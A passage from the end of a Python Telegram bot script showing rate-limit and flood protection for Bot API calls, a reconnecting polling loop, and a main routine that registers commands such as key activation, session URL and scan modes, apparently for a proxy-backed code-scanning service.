                     f"🔁 Retries: {retries}\n⏱ Elapsed: {elapsed_str}\n")
    await bot.reply_to(message, premium_emoji("\n".join(lines)), parse_mode="HTML")


# ========== MAIN ==========

# ========== TELEGRAM FLOOD PROTECTION ==========
# Every Telegram Bot API call goes through this guard:
#   1. Calls are spaced >= _TG_MIN_INTERVAL apart (no bursts).
#   2. A 429 sets a global mute; later calls wait it out instead of
#      hammering Telegram and extending the mute.
#   3. Stale updates queued while offline are skipped on startup.
import functools as _functools

_TG_MIN_INTERVAL = 0.15  # max ~7 Telegram API calls/sec
_TG_MUTE_UNTIL = 0.0
_TG_LAST_CALL = 0.0
_TG_LOCK = None


class TgMutedDrop(Exception):
    """Raised to discard a Telegram call while the bot is 429-muted."""


def _tg_lock():
    global _TG_LOCK
    if _TG_LOCK is None:
        _TG_LOCK = asyncio.Lock()
    return _TG_LOCK


def _tg_retry_after(exc):
    try:
        m = re.search(r"retry after (\d+)", str(exc))
        if m:
            return int(m.group(1))
    except Exception:
        pass
    return 30


def _tg_note_429(exc):
    global _TG_MUTE_UNTIL
    retry_after = _tg_retry_after(exc)
    _TG_MUTE_UNTIL = max(_TG_MUTE_UNTIL, time.monotonic() + retry_after)
    print(f"[tg-flood] 429: pausing Telegram calls for {retry_after}s")


async def _tg_throttle(is_polling=False):
    global _TG_LAST_CALL
    now = time.monotonic()
    if now < _TG_MUTE_UNTIL:
        if is_polling:
            # Polling is a single caller: park it (outside the lock) in
            # short sleeps until the mute ends; it cannot pile up.
            while time.monotonic() < _TG_MUTE_UNTIL:
                await asyncio.sleep(min(_TG_MUTE_UNTIL - time.monotonic(), 5))
        else:
            # Fail-and-drop (user spec 2026-10-11, Minmay style): while
            # muted, discard the call instead of queueing it. Display
            # pushes re-render the full list on the next successful push,
            # and found codes are already saved in the DB, so a dropped
            # call loses nothing permanent.
            raise TgMutedDrop(f"muted, {int(_TG_MUTE_UNTIL - now)}s left")
    async with _tg_lock():
        # Soft resume: for 2 minutes after a mute lifts, space calls at
        # 1s instead of the usual interval so the bot ramps up gradually.
        interval = 1.0 if time.monotonic() < _TG_MUTE_UNTIL + 120 else _TG_MIN_INTERVAL
        gap = time.monotonic() - _TG_LAST_CALL
        if gap < interval:
            await asyncio.sleep(interval - gap)
        _TG_LAST_CALL = time.monotonic()


def _tg_is_429(exc):
    if getattr(exc, "error_code", None) == 429:
        return True
    s = str(exc)
    return "Too Many Requests" in s or "retry after" in s


def _wrap_tg_method(orig):
    @_functools.wraps(orig)
    async def wrapper(*args, **kwargs):
        await _tg_throttle(is_polling=(getattr(orig, "__name__", "") == "get_updates"))
        try:
            return await orig(*args, **kwargs)
        except Exception as e:
            if _tg_is_429(e):
                _tg_note_429(e)
            raise
    wrapper._tg_wrapped = True
    return wrapper


def install_tg_flood_protection():
    for name in ("send_message", "edit_message_text", "reply_to",
                 "send_document", "answer_callback_query", "delete_message",
                 "set_my_commands", "get_updates"):
        orig = getattr(bot, name, None)
        if orig is not None and not getattr(orig, "_tg_wrapped", False):
            setattr(bot, name, _wrap_tg_method(orig))
    print("[tg-flood] protection installed")


async def skip_stale_updates():
    # Updates queued while the bot was offline would all be answered at once
    # (burst -> 429). Confirm up to the latest so polling starts fresh.
    try:
        updates = await bot.get_updates(offset=-1, limit=1, timeout=10)
        if updates:
            await bot.get_updates(offset=updates[-1].update_id + 1, limit=1, timeout=10)
            print(f"[tg-flood] skipped {len(updates)} stale update(s)")
    except Exception as e:
        print(f"[tg-flood] skip-stale failed: {type(e).__name__}")


async def start_polling():
    backoff = 5
    while True:
        try:
            print("[polling] Starting infinity_polling...")
            await bot.infinity_polling(timeout=60, request_timeout=120)
            print("[polling] infinity_polling exited cleanly, restarting...")
            await asyncio.sleep(2)
            backoff = 5
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"[polling] Connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"[polling] Unexpected error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)


async def main():
    loop = asyncio.get_running_loop()
    main_task = asyncio.current_task()
    loop.add_signal_handler(signal.SIGTERM, main_task.cancel)
    get_proxy_manager()
    install_tg_flood_protection()
    web_task = asyncio.create_task(web_server())
    checker_task = asyncio.create_task(proxy_health_checker())
    try:
        commands = [
            types.BotCommand("start", "Open dashboard"),
            types.BotCommand("help", "Commands and shortcuts"),
            types.BotCommand("key", "Activate your key"),
            types.BotCommand("input", "Set session URL"),
            types.BotCommand("scan", "Scan modes"),
            types.BotCommand("stop", "Stop your scan"),
            types.BotCommand("result", "Saved results"),
            types.BotCommand("id", "Your Telegram ID"),
        ]
        try:
            await bot.set_my_commands(commands)
            print("[bot] Command menu registered")
        except Exception as exc:
            print(f"[bot] Command menu could not be registered: {type(exc).__name__}: {exc}")
        await skip_stale_updates()
        await start_polling()
    finally:
        checker_task.cancel()
        web_task.cancel()
        await asyncio.gather(checker_task, web_task, return_exceptions=True)


if __name__ == '__main__':
    asyncio.run(main())
